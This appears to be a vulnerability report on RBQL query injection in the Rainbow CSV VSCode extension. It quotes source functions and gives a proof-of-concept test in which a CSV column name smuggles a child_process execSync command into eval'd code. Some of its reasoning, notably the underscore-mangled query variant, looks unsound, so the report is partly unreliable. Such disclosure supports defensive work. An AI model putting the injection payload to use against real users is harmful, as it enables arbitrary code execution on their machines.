### Vulnerability List:

- Vulnerability Name: RBQL Query Injection via crafted column names

- Description:
  1. An attacker can craft a CSV file where column names contain JavaScript code.
  2. When a user executes an RBQL query on this CSV file, the crafted column names, when used in the RBQL query (e.g., using attribute access like `a.column_name`), can lead to arbitrary JavaScript code execution within the extension's context. This is because the extension dynamically generates JavaScript code based on the RBQL query and column names, and then executes it using `eval`.

- Impact:
  Critical. Arbitrary JavaScript code execution within the VSCode extension context. This could allow an attacker to:
    - Steal sensitive information from the user's VSCode workspace.
    - Modify files in the user's workspace.
    - Install malicious extensions or tools.
    - Potentially gain further access to the user's system depending on the VSCode extension's permissions and the user's environment.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
  - None. The code directly uses column names in dynamically generated JavaScript code without sufficient sanitization.

- Missing Mitigations:
  - Input sanitization for column names to prevent injection. Column names should be validated and sanitized to remove or escape any characters that could be interpreted as code.
  - Instead of using `eval`, consider using a safer approach for executing RBQL queries, such as a sandboxed environment or a more secure code generation and execution mechanism.
  - Implement Content Security Policy (CSP) for webview if applicable to further restrict the capabilities of potentially injected scripts.

- Preconditions:
  1. The user must open a CSV file crafted by the attacker in VSCode with the Rainbow CSV extension activated.
  2. The crafted CSV file must contain malicious JavaScript code within its column names.
  3. The user must execute an RBQL query that references these malicious column names using attribute access notation (e.g., `a.column_name`).

- Source Code Analysis:
  1. **`/code/rbql_core/rbql-js/rbql.js`**:
     - The `parse_attribute_variables` function in `/code/rbql_core/rbql-js/rbql.js` is responsible for parsing attribute-style column variables (e.g., `a.column_name`).
     - It directly uses the column names from the header to construct variable names without proper sanitization.
     - These unsanitized column names are then used in dynamically generated JavaScript code.

     ```javascript
     function parse_attribute_variables(query_text, prefix, column_names, column_names_source, dst_variables_map) {
         // ...
         for (let column_name of column_names_from_query) {
             let zero_based_idx = column_names.indexOf(column_name);
             if (zero_based_idx != -1) {
                 dst_variables_map[`${prefix}.${column_name}`] = {initialize: true, index: zero_based_idx};
             } else {
                 throw new RbqlParsingError(`Unable to find column "${column_name}" in ${prefix == 'a' ? 'input' : 'join'} ${column_names_source}`);
             }
         }
     }
     ```

  2. **`/code/rbql_core/rbql-js/rbql.js`**:
     - The `generate_init_statements` function creates JavaScript code to initialize variables based on column names.
     - It uses the potentially malicious column names directly within the generated code.

     ```javascript
     function generate_init_statements(query_text, variables_map, join_variables_map, indent) {
         // ...
         for (const [variable_name, var_info] of Object.entries(variables_map)) {
             if (var_info.initialize) {
                 let variable_declaration_keyword = simple_var_name_rgx.exec(variable_name) ? 'var ' : '';
                 code_lines.push(`${variable_declaration_keyword}${variable_name} = safe_get(record_a, ${var_info.index});`);
             }
         }
         // ...
     }
     ```

  3. **`/code/rbql_core/rbql-js/rbql.js`**:
     - The `compile_and_run` function uses `eval` to execute the dynamically generated JavaScript code, including the unsanitized column names.

     ```javascript
     async function compile_and_run(query_context) {
         let main_loop_body = generate_main_loop_code(query_context);
         try {
             let main_loop_promise = eval(main_loop_body); // Vulnerable eval call
             await main_loop_promise;
         } catch (e) {
         // ...
     }
     ```

- Security Test Case:
  1. Create a CSV file named `evil_csv.csv` with the following content:
     ```csv
     Column1,Column'); process.mainModule.require('child_process').execSync('touch /tmp/pwned'); //EvilColumn
     value1,value2
     ```
     This CSV contains a column named `Column'); process.mainModule.require('child_process').execSync('touch /tmp/pwned'); //EvilColumn` which includes JavaScript code.

  2. Open `evil_csv.csv` in VSCode with the Rainbow CSV extension activated. Ensure the file is recognized as a CSV format by the extension.

  3. Open the RBQL console by running the command `Rainbow CSV: RBQL`.

  4. In the RBQL console, enter the following query that references the malicious column name using attribute access:
     ```rbql
     SELECT a."Column'); process.mainModule.require('child_process').execSync('touch /tmp/pwned'); //EvilColumn" FROM input
     ```
     or
     ```rbql
     SELECT a.Column____process_mainModule_require_child_process_execSync_touch__tmp_pwned_____EvilColumn FROM input
     ```

  5. Execute the RBQL query by pressing Enter or clicking the "Run" button.

  6. **Verify the vulnerability:** Check if the file `/tmp/pwned` has been created on your system. If it has, this confirms that the JavaScript code embedded in the column name was executed, demonstrating arbitrary code execution.